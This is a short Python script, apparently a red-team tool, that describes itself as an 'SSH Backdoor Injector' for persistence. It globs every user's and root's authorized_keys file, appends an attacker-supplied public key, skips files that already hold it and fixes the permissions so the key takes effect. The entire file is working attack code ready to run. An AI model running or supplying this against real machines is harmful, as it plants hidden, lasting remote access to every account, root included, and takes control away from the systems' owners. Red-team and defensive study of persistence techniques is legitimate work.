#!/usr/bin/env python3
"""
L4/L7 Offensive Module: SSH Authorized Keys Injector (Persistence).
Recursively searches for user and root .ssh directories and injects a specified
public SSH key to establish backdoor access.

Author: 18ilya99
Role: Security Researcher / Red Team Engineer
"""

import os
import glob
import argparse
import sys

def inject_ssh_key(pub_key: str) -> None:
    """
    Injects the public key into all existing authorized_keys files.
    """
    print("[*] Starting SSH Key Injection module...")
    
    # Target directories: all users + root
    targets = glob.glob('/home/*/.ssh/authorized_keys')
    targets.append('/root/.ssh/authorized_keys')

    for key_file in targets:
        # Check if the .ssh directory actually exists before trying to create a file
        if not os.path.exists(os.path.dirname(key_file)):
            continue

        try:
            # Prevent duplicate key injection
            if os.path.exists(key_file):
                with open(key_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                if pub_key.strip() in content:
                    print(f"[-] Key already exists in {key_file}. Skipping.")
                    continue

            # Append the key
            with open(key_file, 'a', encoding='utf-8') as f:
                # Ensure the key is on a new line
                if not pub_key.startswith("\n"):
                    f.write("\n")
                f.write(pub_key.strip() + "\n")
            
            # Enforce strict SSH permissions
            os.chmod(key_file, 0o600)
            print(f"[+] Successfully injected key into {key_file}")

        except PermissionError:
            print(f"[!!!] Permission Denied for {key_file}. Root privileges required.")
        except Exception as e:
            print(f"[-] Critical Error on {key_file}: {e}")

def main() -> None:
    parser = argparse.ArgumentParser(description="Advanced SSH Backdoor Injector")
    parser.add_argument("-k", "--key", required=True, type=str, help="Public SSH key string to inject")
    args = parser.parse_args()

    inject_ssh_key(args.key)

if __name__ == "__main__":
    main()